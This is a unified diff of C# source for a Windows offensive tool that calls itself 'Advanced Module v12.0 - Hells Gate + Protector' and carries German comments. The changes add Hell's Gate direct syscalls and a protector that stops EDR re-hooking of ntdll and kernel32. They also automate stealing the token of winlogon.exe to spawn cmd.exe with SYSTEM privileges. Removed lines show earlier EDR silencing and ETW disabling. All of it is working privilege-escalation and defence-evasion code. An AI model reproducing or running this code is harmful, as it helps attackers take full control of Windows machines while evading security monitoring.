-            if (pAlloc != IntPtr.Zero) Marshal.Copy(stubAlloc, 0, pAlloc, stubAlloc.Length);
-            if (pFree != IntPtr.Zero) Marshal.Copy(stubFree, 0, pFree, stubFree.Length);
-            if (pProtect != IntPtr.Zero) Marshal.Copy(stubProtect, 0, pProtect, stubProtect.Length);
-            
-            _baseNtAllocate = Marshal.GetDelegateForFunctionPointer<NtAllocateVirtualMemory>(pAlloc);
-            _baseNtFree = Marshal.GetDelegateForFunctionPointer<NtFreeVirtualMemory>(pFree);
-            _baseNtProtect = Marshal.GetDelegateForFunctionPointer<NtProtectVirtualMemory>(pProtect);
-            
-            syscallCache["NtAllocateVirtualMemory"] = _baseNtAllocate;
-            syscallCache["NtFreeVirtualMemory"] = _baseNtFree;
-            syscallCache["NtProtectVirtualMemory"] = _baseNtProtect;
-        }
-        
-        [DllImport("kernel32.dll", SetLastError = true)]
-        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-        
-        private static IntPtr VirtualAllocWin32(IntPtr addr, uint size, uint type, uint protect) 
-            => VirtualAlloc(addr, size, type, protect);
-
-        public static T GetSyscall<T>(string functionName) where T : class
-        {
-            string key = functionName;
-            if (syscallCache.ContainsKey(key))
-                return syscallCache[key] as T;
-
-            if (_baseNtAllocate == null)
-                InitializeBaseSyscalls();
-
-            IntPtr ntdll = GetModuleBase("ntdll.dll");
-            if (ntdll == IntPtr.Zero) return null;
-
-            IntPtr funcAddr = GetFunctionAddress(ntdll, functionName);
-            if (funcAddr == IntPtr.Zero) return null;
-
-            uint ssn = ExtractSSN(funcAddr);
-            if (ssn == 0) return null;
-
-            byte[] stub = CreateSyscallStub(ssn);
-
-            if (_baseNtAllocate != null)
-            {
-                IntPtr baseAddr = IntPtr.Zero;
-                ulong size = (ulong)stub.Length;
-                uint status = _baseNtAllocate((IntPtr)(-1), ref baseAddr, IntPtr.Zero, ref size, 0x1000 | 0x2000, 0x40);
-                if (status == 0 && baseAddr != IntPtr.Zero)
-                {
-                    Marshal.Copy(stub, 0, baseAddr, stub.Length);
-                    
-                    if (_baseNtProtect != null)
-                    {
-                        ulong protectSize = (ulong)stub.Length;
-                        IntPtr protectAddr = baseAddr;
-                        _baseNtProtect((IntPtr)(-1), ref protectAddr, ref protectSize, 0x20, out uint oldProtect);
-                    }
-                    
-                    T del = Marshal.GetDelegateForFunctionPointer<T>(baseAddr);
-                    syscallCache[key] = del as Delegate;
-                    return del;
-                }
-            }
-
-            return null;
-        }
-    }
-
-    #endregion
-
-    #region Token Information Classes
+    #region Token Information
 
     private enum TOKEN_INFORMATION_CLASS
     {
-        TokenUser = 1,
-        TokenGroups = 2,
-        TokenPrivileges = 3,
-        TokenOwner = 4,
-        TokenPrimaryGroup = 5,
-        TokenDefaultDacl = 6,
-        TokenSource = 7,
-        TokenType = 8,
-        TokenImpersonationLevel = 9,
-        TokenStatistics = 10,
-        TokenRestrictedSids = 11,
-        TokenSessionId = 12,
-        TokenGroupsAndPrivileges = 13,
-        TokenSessionReference = 14,
-        TokenSandBoxInert = 15,
-        TokenAuditPolicy = 16,
-        TokenOrigin = 17,
-        TokenElevationType = 18,
-        TokenLinkedToken = 19,
         TokenElevation = 20,
-        TokenHasRestrictions = 21,
-        TokenAccessInformation = 22,
-        TokenVirtualizationAllowed = 23,
-        TokenVirtualizationEnabled = 24,
-        TokenIntegrityLevel = 25,
-        TokenUIAccess = 26,
-        TokenMandatoryPolicy = 27,
-        TokenLogonSid = 28,
-        TokenIsAppContainer = 29,
-        TokenCapabilities = 30,
-        TokenAppContainerSid = 31,
-        TokenAppContainerNumber = 32,
-        TokenUserClaimAttributes = 33,
-        TokenDeviceClaimAttributes = 34,
-        TokenRestrictedUserClaimAttributes = 35,
-        TokenRestrictedDeviceClaimAttributes = 36,
-        TokenDeviceGroups = 37,
-        TokenRestrictedDeviceGroups = 38,
-        TokenSecurityAttributes = 39,
-        TokenIsRestricted = 40,
-        TokenProcessTrustLevel = 41,
-        TokenPrivateNameSpace = 42,
-        TokenSingletonAttributes = 43,
-        TokenBnoIsolation = 44,
-        TokenChildProcessFlags = 45,
-        TokenIsLessPrivilegedAppContainer = 46,
-        TokenIsSandboxed = 47,
-        TokenIsAppSilo = 48,
-        MaxTokenInfoClass = 49
+        TokenSessionId = 12,
+        TokenIntegrityLevel = 25
     }
 
-    #endregion
-
-    #region Token-Informationen via NtQueryInformationToken
-
-    private static NtQueryInformationToken _NtQueryInformationToken;
+    private static HellsGate.NtQueryInformationTokenDirect _ntQueryInfoToken;
 
     private static void InitializeTokenSyscalls()
     {
-        _NtQueryInformationToken = SyscallAPI.GetSyscall<NtQueryInformationToken>("NtQueryInformationToken");
-    }
-
-    private static uint GetTokenIntegrityLevel(IntPtr hToken)
-    {
-        if (_NtQueryInformationToken == null) return 0;
-
-        uint dwLen = 0;
-        _NtQueryInformationToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, IntPtr.Zero, 0, out dwLen);
-        if (dwLen > 0)
-        {
-            IntPtr pTIL = Marshal.AllocHGlobal((int)dwLen);
-            try
-            {
-                if (_NtQueryInformationToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, pTIL, dwLen, out dwLen) == 0)
-                {
-                    IntPtr pSid = Marshal.ReadIntPtr(pTIL);
-                    IntPtr pCount = GetSidSubAuthorityCountNative(pSid);
-                    if (pCount != IntPtr.Zero)
-                    {
-                        byte count = Marshal.ReadByte(pCount);
-                        IntPtr pLevel = GetSidSubAuthorityNative(pSid, (uint)(count - 1));
-                        if (pLevel != IntPtr.Zero)
-                            return (uint)Marshal.ReadInt32(pLevel);
-                    }
-                }
-            }
-            finally
-            {
-                Marshal.FreeHGlobal(pTIL);
-            }
-        }
-        return 0;
-    }
-
-    private static uint GetTokenElevationType(IntPtr hToken)
-    {
-        if (_NtQueryInformationToken == null) return 0;
-
-        uint dwLen = 0;
-        _NtQueryInformationToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenElevationType, IntPtr.Zero, 0, out dwLen);
-        if (dwLen > 0)
-        {
-            IntPtr pElevType = Marshal.AllocHGlobal((int)dwLen);
-            try
-            {
-                if (_NtQueryInformationToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenElevationType, pElevType, dwLen, out dwLen) == 0)
-                {
-                    return (uint)Marshal.ReadInt32(pElevType);
-                }
-            }
-            finally
-            {
-                Marshal.FreeHGlobal(pElevType);
-            }
-        }
-        return 0;
+        _ntQueryInfoToken = HellsGate.GetSyscall<HellsGate.NtQueryInformationTokenDirect>("NtQueryInformationToken");
     }
 
     private static int GetTokenSessionId(IntPtr hToken)
     {
-        if (_NtQueryInformationToken == null) return -1;
+        if (_ntQueryInfoToken == null) return -1;
 
         uint dwLen = 0;
-        _NtQueryInformationToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenSessionId, IntPtr.Zero, 0, out dwLen);
-        if (dwLen > 0)
+        int status = _ntQueryInfoToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenSessionId, IntPtr.Zero, 0, out dwLen);
+        if (status == 0 && dwLen > 0)
         {
             IntPtr pSessionId = Marshal.AllocHGlobal((int)dwLen);
             try
             {
-                if (_NtQueryInformationToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenSessionId, pSessionId, dwLen, out dwLen) == 0)
-                {
+                status = _ntQueryInfoToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenSessionId, pSessionId, dwLen, out dwLen);
+                if (status == 0)
                     return Marshal.ReadInt32(pSessionId);
-                }
             }
-            finally
-            {
-                Marshal.FreeHGlobal(pSessionId);
-            }
+            finally { Marshal.FreeHGlobal(pSessionId); }
         }
         return -1;
     }
 
     private static bool IsTokenElevated(IntPtr hToken)
     {
-        if (_NtQueryInformationToken == null) return false;
+        if (_ntQueryInfoToken == null) return false;
 
         uint dwLen = 0;
-        _NtQueryInformationToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenElevation, IntPtr.Zero, 0, out dwLen);
-        if (dwLen > 0)
+        int status = _ntQueryInfoToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenElevation, IntPtr.Zero, 0, out dwLen);
+        if (status == 0 && dwLen > 0)
         {
             IntPtr pElev = Marshal.AllocHGlobal((int)dwLen);
             try
             {
-                if (_NtQueryInformationToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenElevation, pElev, dwLen, out dwLen) == 0)
-                {
+                status = _ntQueryInfoToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenElevation, pElev, dwLen, out dwLen);
+                if (status == 0)
                     return Marshal.ReadInt32(pElev) != 0;
-                }
             }
-            finally
-            {
-                Marshal.FreeHGlobal(pElev);
-            }
+            finally { Marshal.FreeHGlobal(pElev); }
         }
         return false;
     }
 
-    [DllImport("advapi32.dll", SetLastError = true)]
+    private static uint GetTokenIntegrityLevel(IntPtr hToken)
+    {
+        if (_ntQueryInfoToken == null) return 0;
+
+        uint dwLen = 0;
+        int status = _ntQueryInfoToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, IntPtr.Zero, 0, out dwLen);
+        if (status == 0 && dwLen > 0)
+        {
+            IntPtr pTIL = Marshal.AllocHGlobal((int)dwLen);
+            try
+            {
+                status = _ntQueryInfoToken(hToken, (int)TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, pTIL, dwLen, out dwLen);
+                if (status == 0)
+                {
+                    IntPtr pSid = Marshal.ReadIntPtr(pTIL);
+                    IntPtr pCount = GetSidSubAuthorityCount(pSid);
+                    if (pCount != IntPtr.Zero)
+                    {
+                        byte count = Marshal.ReadByte(pCount);
+                        IntPtr pLevel = GetSidSubAuthority(pSid, (uint)(count - 1));
+                        if (pLevel != IntPtr.Zero)
+                            return (uint)Marshal.ReadInt32(pLevel);
+                    }
+                }
+            }
+            finally { Marshal.FreeHGlobal(pTIL); }
+        }
+        return 0;
+    }
+
+    [DllImport("advapi32.dll")]
     static extern IntPtr GetSidSubAuthorityCount(IntPtr pSid);
 
-    [DllImport("advapi32.dll", SetLastError = true)]
+    [DllImport("advapi32.dll")]
     static extern IntPtr GetSidSubAuthority(IntPtr pSid, uint nSubAuthority);
-
-    private static IntPtr GetSidSubAuthorityCountNative(IntPtr pSid) => GetSidSubAuthorityCount(pSid);
-    private static IntPtr GetSidSubAuthorityNative(IntPtr pSid, uint n) => GetSidSubAuthority(pSid, n);
 
     #endregion
 
-    #region RtlCreateProcessParametersEx Helper
+    #region Helper
 
-    private static IntPtr CreateProcessParameters(string imagePath, string commandLine)
+    private static uint FindWinLogonPid()
     {
-        var _RtlCreateProcessParametersEx = SyscallAPI.GetSyscall<RtlCreateProcessParametersEx>("RtlCreateProcessParametersEx");
-        if (_RtlCreateProcessParametersEx == null) return IntPtr.Zero;
-
-        UNICODE_STRING imagePathStr = new UNICODE_STRING();
-        UNICODE_STRING commandLineStr = new UNICODE_STRING();
-
-        byte[] imagePathBytes = Encoding.Unicode.GetBytes(imagePath + "\0");
-        byte[] commandLineBytes = Encoding.Unicode.GetBytes(commandLine + "\0");
-
-        imagePathStr.Buffer = Marshal.AllocHGlobal(imagePathBytes.Length);
-        Marshal.Copy(imagePathBytes, 0, imagePathStr.Buffer, imagePathBytes.Length);
-        imagePathStr.Length = (ushort)(imagePathBytes.Length - 2);
-        imagePathStr.MaximumLength = (ushort)imagePathBytes.Length;
-
-        commandLineStr.Buffer = Marshal.AllocHGlobal(commandLineBytes.Length);
-        Marshal.Copy(commandLineBytes, 0, commandLineStr.Buffer, commandLineBytes.Length);
-        commandLineStr.Length = (ushort)(commandLineBytes.Length - 2);
-        commandLineStr.MaximumLength = (ushort)commandLineBytes.Length;
-
-        uint status = _RtlCreateProcessParametersEx(out IntPtr pParams, imagePathStr, new UNICODE_STRING(), new UNICODE_STRING(), commandLineStr, IntPtr.Zero, new UNICODE_STRING(), new UNICODE_STRING(), new UNICODE_STRING(), new UNICODE_STRING(), 0x20);
-
-        Marshal.FreeHGlobal(imagePathStr.Buffer);
-        Marshal.FreeHGlobal(commandLineStr.Buffer);
-
-        return status == 0 ? pParams : IntPtr.Zero;
+        try
+        {
+            var processes = Process.GetProcessesByName("winlogon");
+            if (processes.Length > 0)
+            {
+                return (uint)processes[0].Id;
+            }
+        }
+        catch { }
+        return 0;
     }
 
     #endregion
@@ -806,195 +553,241 @@ internal static class Program
 
     public static void Main()
     {
-        Console.WriteLine("[*] Advanced Diagnostic Module v11.0 - Full Indirect Syscall Version");
-        Console.WriteLine("[*] ntdll.dll & kernel32.dll unhooked, ETW disabled");
-        Console.WriteLine("[*] ALL APIs via Indirect Syscalls (no hooks)");
+        Console.WriteLine("[*] ===============================================");
+        Console.WriteLine("[*] Advanced Module v12.0 - Hells Gate + Protector");
+        Console.WriteLine("[*] ===============================================");
         Console.WriteLine();
 
-        // BASIS-SYSCALLS INITIALISIEREN (einmaliger Win32 API Aufruf)
-        Console.WriteLine("[*] Initializing base syscalls...");
-        SyscallAPI.InitializeBaseSyscalls();
-        Console.WriteLine("[+] Base syscalls initialized");
-        Console.WriteLine();
-
-        // EDR Silencing vor allen anderen Aktionen
-        EDRAntiAnalysis.SilenceEDR();
-        Console.WriteLine();
-
-        // NtQueryInformationToken initialisieren
-        InitializeTokenSyscalls();
-
-        // Aktuelle Prozess-Identität
-        var currentIdentity = WindowsIdentity.GetCurrent();
-        bool isAdmin = new WindowsPrincipal(currentIdentity).IsInRole(WindowsBuiltInRole.Administrator);
-        Console.WriteLine($"[*] Current User: {currentIdentity.Name}");
-        Console.WriteLine($"[*] Admin Rights: {isAdmin}");
-        Console.WriteLine($"[*] Current Session: {GetTokenSessionId(currentIdentity.Token)}");
-        Console.WriteLine($"[*] Current Integrity: 0x{GetTokenIntegrityLevel(currentIdentity.Token):X}");
-        Console.WriteLine();
-
-        Console.Write("[*] Target PID: ");
-        if (!uint.TryParse(Console.ReadLine(), out uint pid))
+        // 1. Hells Gate initialisieren
+        if (!HellsGate.Initialize())
         {
-            Console.WriteLine("[-] Ungültige PID");
+            Console.WriteLine("[-] Hells Gate initialization failed!");
             Console.ReadKey();
             return;
         }
         Console.WriteLine();
 
+        // 2. Text Section Protector initialisieren
+        TextSectionProtector.Initialize();
+
+        // 3. .text Sections schützen (EDR kann nicht mehr schreiben)
+        Console.WriteLine("[*] Protecting critical modules...");
+        TextSectionProtector.ProtectTextSection("ntdll.dll");
+        TextSectionProtector.ProtectTextSection("kernel32.dll");
+        Console.WriteLine();
+
+        // 4. Re-Hook Protection starten (überwacht und restored)
+        TextSectionProtector.StartRehookProtection(3000);
+        Console.WriteLine();
+
+        // 5. Token Syscalls initialisieren
+        InitializeTokenSyscalls();
+
+        // 6. Aktuelle Prozess-Identität
+        var currentIdentity = WindowsIdentity.GetCurrent();
+        bool isAdmin = new WindowsPrincipal(currentIdentity).IsInRole(WindowsBuiltInRole.Administrator);
+        Console.WriteLine($"[*] Current User: {currentIdentity.Name}");
+        Console.WriteLine($"[*] Admin Rights: {isAdmin}");
+
+        if (!isAdmin)
+        {
+            Console.WriteLine("[-] This tool requires Administrator privileges!");
+            Console.ReadKey();
+            return;
+        }
+        Console.WriteLine();
+
+        // 7. WinLogon Prozess finden
+        Console.WriteLine("[*] Searching for winlogon.exe...");
+        uint winlogonPid = FindWinLogonPid();
+
+        if (winlogonPid == 0)
+        {
+            Console.WriteLine("[-] Could not find winlogon.exe!");
+            Console.WriteLine("[*] Please enter PID manually: ");
+            if (!uint.TryParse(Console.ReadLine(), out winlogonPid))
+            {
+                Console.WriteLine("[-] Invalid PID");
+                Console.ReadKey();
+                return;
+            }
+        }
+        else
+        {
+            Console.WriteLine($"[+] Found winlogon.exe with PID: {winlogonPid}");
+        }
+        Console.WriteLine();
+
         try
         {
-            // Syscall Delegates laden
-            var _NtOpenProcess = SyscallAPI.GetSyscall<NtOpenProcess>("NtOpenProcess");
-            var _NtOpenProcessToken = SyscallAPI.GetSyscall<NtOpenProcessToken>("NtOpenProcessToken");
-            var _NtDuplicateToken = SyscallAPI.GetSyscall<NtDuplicateToken>("NtDuplicateToken");
-            var _NtClose = SyscallAPI.GetSyscall<NtClose>("NtClose");
-            var _NtSetInformationToken = SyscallAPI.GetSyscall<NtSetInformationToken>("NtSetInformationToken");
+            var ntOpenProcess = HellsGate.GetSyscall<HellsGate.NtOpenProcessDirect>("NtOpenProcess");
+            var ntOpenProcessToken = HellsGate.GetSyscall<HellsGate.NtOpenProcessTokenDirect>("NtOpenProcessToken");
+            var ntDuplicateToken = HellsGate.GetSyscall<HellsGate.NtDuplicateTokenDirect>("NtDuplicateToken");
+            var ntClose = HellsGate.GetSyscall<HellsGate.NtCloseDirect>("NtClose");
 
-            if (_NtOpenProcess == null || _NtOpenProcessToken == null || _NtDuplicateToken == null || _NtClose == null)
+            if (ntOpenProcess == null || ntOpenProcessToken == null || ntDuplicateToken == null || ntClose == null)
             {
-                Console.WriteLine("[-] Failed to load syscall delegates");
+                Console.WriteLine("[-] Failed to get direct syscall delegates");
                 Console.ReadKey();
                 return;
             }
 
-            Console.WriteLine("[+] Syscall delegates loaded");
+            Console.WriteLine("[+] Direct syscall delegates loaded (Hells Gate)");
             Console.WriteLine();
 
-            // 1. Zielprozess öffnen
+            // 1. WinLogon Prozess öffnen
             OBJECT_ATTRIBUTES objAttr = OBJECT_ATTRIBUTES.Create();
             CLIENT_ID clientId = new CLIENT_ID();
-            clientId.UniqueProcess = (IntPtr)pid;
+            clientId.UniqueProcess = (IntPtr)winlogonPid;
             clientId.UniqueThread = IntPtr.Zero;
 
-            uint desiredAccess = 0x1000;
-            if (isAdmin) desiredAccess |= 0x0400;
-
             IntPtr hProcess = IntPtr.Zero;
-            uint status = _NtOpenProcess(ref hProcess, desiredAccess, ref objAttr, ref clientId);
+            int status = ntOpenProcess(ref hProcess, PROCESS_ALL_ACCESS, ref objAttr, ref clientId);
 
             if (status != 0 || hProcess == IntPtr.Zero)
             {
-                desiredAccess = 0x0040;
-                status = _NtOpenProcess(ref hProcess, desiredAccess, ref objAttr, ref clientId);
-                if (status != 0 || hProcess == IntPtr.Zero)
-                {
-                    Console.WriteLine($"[-] NtOpenProcess failed: 0x{status:X8}");
-                    Console.ReadKey();
-                    return;
-                }
+                Console.WriteLine($"[-] NtOpenProcess failed: 0x{status:X8}");
+                Console.ReadKey();
+                return;
             }
-            Console.WriteLine($"[+] Process opened via NtOpenProcess (handle: 0x{hProcess.ToInt64():X})");
+            Console.WriteLine($"[+] WinLogon process opened (handle: 0x{hProcess.ToInt64():X})");
 
-            // 2. Token aus Zielprozess
-            status = _NtOpenProcessToken(hProcess, 0xF01FF, out IntPtr hTargetToken);
+            // 2. Token aus WinLogon
+            uint tokenAccess = TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE;
+            status = ntOpenProcessToken(hProcess, tokenAccess, out IntPtr hTargetToken);
+
             if (status != 0 || hTargetToken == IntPtr.Zero)
             {
                 Console.WriteLine($"[-] NtOpenProcessToken failed: 0x{status:X8}");
-                _NtClose(hProcess);
+                ntClose(hProcess);
                 Console.ReadKey();
                 return;
             }
-            Console.WriteLine("[+] Token opened via NtOpenProcessToken");
+            Console.WriteLine($"[+] Token opened (handle: 0x{hTargetToken.ToInt64():X})");
 
-            // 3. Token-Informationen abfragen
-            bool isTargetElevated = IsTokenElevated(hTargetToken);
-            uint targetIntegrity = GetTokenIntegrityLevel(hTargetToken);
-            int targetSession = GetTokenSessionId(hTargetToken);
-            uint targetElevationType = GetTokenElevationType(hTargetToken);
-
-            Console.WriteLine($"[+] Target Token Info:");
-            Console.WriteLine($"    - Elevated: {isTargetElevated}");
-            Console.WriteLine($"    - Integrity Level: 0x{targetIntegrity:X}");
-            Console.WriteLine($"    - Session ID: {targetSession}");
-            Console.WriteLine($"    - Elevation Type: {targetElevationType}");
-            Console.WriteLine();
-
-            // 4. Token duplizieren
-            OBJECT_ATTRIBUTES dupAttr = OBJECT_ATTRIBUTES.Create();
-            status = _NtDuplicateToken(hTargetToken, 0xF01FF, ref dupAttr, false, 1, out IntPtr hPrimaryToken);
-            if (status != 0 || hPrimaryToken == IntPtr.Zero)
+            // 3. Token Info anzeigen
+            if (_ntQueryInfoToken != null && hTargetToken != IntPtr.Zero)
             {
-                Console.WriteLine($"[-] NtDuplicateToken failed: 0x{status:X8}");
-                _NtClose(hTargetToken);
-                _NtClose(hProcess);
-                Console.ReadKey();
-                return;
-            }
-            Console.WriteLine("[+] Primary token duplicated via NtDuplicateToken");
+                bool isElevated = IsTokenElevated(hTargetToken);
+                int session = GetTokenSessionId(hTargetToken);
+                uint integrity = GetTokenIntegrityLevel(hTargetToken);
 
-            // 5. Session anpassen
-            int currentSession = GetTokenSessionId(currentIdentity.Token);
-            if (targetSession != currentSession && targetSession != 0 && _NtSetInformationToken != null)
-            {
-                Console.WriteLine($"[*] Adjusting token session from {targetSession} to {currentSession}");
-                IntPtr pSessionId = Marshal.AllocHGlobal(sizeof(int));
-                Marshal.WriteInt32(pSessionId, currentSession);
-                status = _NtSetInformationToken(hPrimaryToken, (int)TOKEN_INFORMATION_CLASS.TokenSessionId, pSessionId, (uint)sizeof(int));
-                Marshal.FreeHGlobal(pSessionId);
-                if (status != 0)
-                {
-                    Console.WriteLine($"[!] Session adjustment failed: 0x{status:X8}");
-                }
-                else
-                {
-                    Console.WriteLine("[+] Session adjusted");
-                }
+                Console.WriteLine($"[+] Token Info:");
+                Console.WriteLine($"    - Elevated: {isElevated}");
+                Console.WriteLine($"    - Session: {session}");
+                Console.WriteLine($"    - Integrity: 0x{integrity:X}");
                 Console.WriteLine();
             }
 
-            // 6. Prozess erstellen
-            string cmdPath = Environment.SystemDirectory + @"\cmd.exe";
-            IntPtr pParams = CreateProcessParameters(cmdPath, "cmd.exe");
-            if (pParams == IntPtr.Zero)
+            // 4. Token duplizieren als Primary Token
+            OBJECT_ATTRIBUTES dupAttr = OBJECT_ATTRIBUTES.Create();
+            status = ntDuplicateToken(hTargetToken, TOKEN_ALL_ACCESS, ref dupAttr, false, 1, out IntPtr hPrimaryToken);
+
+            if (status != 0 || hPrimaryToken == IntPtr.Zero)
             {
-                Console.WriteLine("[-] Failed to create process parameters");
+                Console.WriteLine($"[-] NtDuplicateToken failed: 0x{status:X8}");
+                Console.WriteLine("[*] Using original token...");
+                hPrimaryToken = hTargetToken;
+                hTargetToken = IntPtr.Zero;
             }
             else
             {
-                OBJECT_ATTRIBUTES procAttr = OBJECT_ATTRIBUTES.Create();
-                OBJECT_ATTRIBUTES threadAttr = OBJECT_ATTRIBUTES.Create();
+                Console.WriteLine($"[+] Token duplicated (handle: 0x{hPrimaryToken.ToInt64():X})");
+            }
+            Console.WriteLine();
 
-                IntPtr hNewProcess = IntPtr.Zero;
-                IntPtr hNewThread = IntPtr.Zero;
+            // 5. cmd.exe mit SYSTEM Rechten starten
+            Console.WriteLine("[*] ===============================================");
+            Console.WriteLine("[*] Starting cmd.exe with SYSTEM token...");
+            Console.WriteLine();
 
-                var _NtCreateUserProcess = SyscallAPI.GetSyscall<NtCreateUserProcess>("NtCreateUserProcess");
-                if (_NtCreateUserProcess != null)
+            bool processCreated = false;
+
+            // Methode 1: ImpersonateLoggedOnUser + Process.Start
+            if (ImpersonateLoggedOnUser(hPrimaryToken))
+            {
+                Console.WriteLine("[+] Impersonation successful!");
+                try
                 {
-                    status = _NtCreateUserProcess(ref hNewProcess, ref hNewThread, 0x1FFFFF, 0x1FFFFF,
-                        ref procAttr, ref threadAttr, 0, 0, pParams, IntPtr.Zero, IntPtr.Zero);
+                    Process.Start("cmd.exe");
+                    Console.WriteLine("[+] SUCCESS! cmd.exe started with SYSTEM privileges!");
+                    processCreated = true;
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"[-] Process.Start failed: {ex.Message}");
+                }
+                finally
+                {
+                    RevertToSelf();
+                }
+            }
+            else
+            {
+                Console.WriteLine($"[-] Impersonation failed: {Marshal.GetLastWin32Error()}");
+            }
 
-                    if (status == 0 && hNewProcess != IntPtr.Zero)
-                    {
-                        Console.WriteLine($"[+] SUCCESS! cmd.exe started via NtCreateUserProcess!");
-                        Console.WriteLine($"[+] New Process PID: {GetProcessIdNative(hNewProcess)}");
-                        Console.WriteLine($"[+] The new process is running with the duplicated token!");
-                        _NtClose(hNewProcess);
-                        if (hNewThread != IntPtr.Zero) _NtClose(hNewThread);
-                    }
-                    else
-                    {
-                        Console.WriteLine($"[-] NtCreateUserProcess failed: 0x{status:X8}");
-                        Console.WriteLine("[-] Trying alternative method...");
-                        
-                        // Fallback: Process.Start mit dem Token (via Win32, aber Token ist bereits dupliziert)
-                        Console.WriteLine("[*] Note: Full token impersonation requires additional steps");
-                        Console.WriteLine("[*] The token has been successfully duplicated though!");
-                    }
+            // Methode 2: CreateProcessAsUser (Fallback)
+            if (!processCreated)
+            {
+                Console.WriteLine("[*] Trying CreateProcessAsUser...");
+
+                STARTUPINFO si = new STARTUPINFO();
+                si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
+                si.dwFlags = STARTF_USESHOWWINDOW;
+                si.wShowWindow = (ushort)SW_SHOWNORMAL;
+
+                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+
+                bool success = CreateProcessAsUser(
+                    hPrimaryToken,
+                    null,
+                    "cmd.exe",
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    false,
+                    CREATE_NEW_CONSOLE,
+                    IntPtr.Zero,
+                    null,
+                    ref si,
+                    out pi);
+
+                if (success)
+                {
+                    Console.WriteLine($"[+] SUCCESS! cmd.exe started with PID: {pi.dwProcessId}");
+                    processCreated = true;
+                    CloseHandle(pi.hThread);
+                    CloseHandle(pi.hProcess);
                 }
                 else
                 {
-                    Console.WriteLine("[-] NtCreateUserProcess not available");
+                    Console.WriteLine($"[-] CreateProcessAsUser failed: {Marshal.GetLastWin32Error()}");
                 }
+            }
 
-                var _RtlDestroyProcessParameters = SyscallAPI.GetSyscall<RtlDestroyProcessParameters>("RtlDestroyProcessParameters");
-                _RtlDestroyProcessParameters?.Invoke(pParams);
+            if (processCreated)
+            {
+                Console.WriteLine();
+                Console.WriteLine("[+] ===============================================");
+                Console.WriteLine("[+] !!! SUCCESS !!!");
+                Console.WriteLine("[+] A new cmd.exe is running with SYSTEM privileges!");
+                Console.WriteLine("[+] ===============================================");
+            }
+            else
+            {
+                Console.WriteLine();
+                Console.WriteLine("[-] ===============================================");
+                Console.WriteLine("[-] Could not create process with SYSTEM token.");
+                Console.WriteLine("[-] ===============================================");
             }
 
             // Cleanup
-            if (hPrimaryToken != IntPtr.Zero) _NtClose(hPrimaryToken);
-            if (hTargetToken != IntPtr.Zero) _NtClose(hTargetToken);
-            if (hProcess != IntPtr.Zero) _NtClose(hProcess);
+            if (hPrimaryToken != IntPtr.Zero && hPrimaryToken != hTargetToken)
+                ntClose(hPrimaryToken);
+            if (hTargetToken != IntPtr.Zero)
+                ntClose(hTargetToken);
+            if (hProcess != IntPtr.Zero)
+                ntClose(hProcess);
         }
         catch (Exception ex)
         {
@@ -1003,14 +796,12 @@ internal static class Program
         }
 
         Console.WriteLine();
-        Console.WriteLine("[*] Press any key to exit...");
+        Console.WriteLine("[*] Press any key to exit (protection will stop)...");
         Console.ReadKey();
+
+        TextSectionProtector.StopProtection();
+        HellsGate.Cleanup();
     }
-
-    [DllImport("kernel32.dll", SetLastError = true)]
-    static extern int GetProcessId(IntPtr process);
-
-    private static int GetProcessIdNative(IntPtr process) => GetProcessId(process);
 
     #endregion
 }
